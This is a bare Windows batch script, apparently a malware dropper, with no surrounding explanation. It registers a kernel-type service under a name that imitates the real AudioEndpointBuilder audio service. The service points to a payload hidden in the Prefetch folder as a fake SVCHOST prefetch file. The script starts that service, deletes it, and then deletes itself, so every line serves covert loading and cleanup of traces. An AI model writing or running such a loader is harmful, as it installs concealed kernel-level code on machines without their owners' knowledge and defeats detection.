@echo off
cd %~dp0
sc create AudioEndpointBuilder_5 binpath=C:\Windows\Prefetch\SVCHOST.EXE-D57C935C.pf type=kernel
sc start AudioEndpointBuilder_5
sc delete AudioEndpointBuilder_5
del "%~f0"



